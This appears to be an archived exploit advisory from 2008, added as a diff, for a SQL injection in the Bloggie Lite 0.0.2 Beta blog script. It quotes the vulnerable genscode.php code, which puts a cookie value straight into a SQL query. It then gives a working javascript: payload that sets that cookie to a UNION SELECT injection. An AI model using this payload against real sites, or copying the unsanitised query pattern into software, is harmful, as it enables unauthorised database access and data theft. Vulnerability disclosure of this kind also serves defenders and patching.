@@ -1,0 +1,26 @@
+# Bloggie Lite 0.0.2 Beta SQl Injection by Insecure Cookie Handling
+# url: http://mywebland.com/download.php?id=20
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+
+vuln file: /genscode.php
+vuln code:
+39: $user_ip = $_SERVER['REMOTE_ADDR'];
+    define('COMMENT_COOKIE', md5($user_ip));
+    if(isset($_COOKIE[COMMENT_COOKIE])) {
+xx: ...
+    $comment_cookie = $_COOKIE[COMMENT_COOKIE];
+55: $sql = "SELECT * FROM ".SCODE_TBL." WHERE cookie = '".$comment_cookie."'";
+
+exploit:
+javascript:document.cookie = "f528764d624db129b32c21fbca0cb8d6=127.0.0.1'+union+all+select+user(),user(),user()/*; path=/";
+
+Hack0wn :D
+
+# milw0rm.com [2008-11-01]
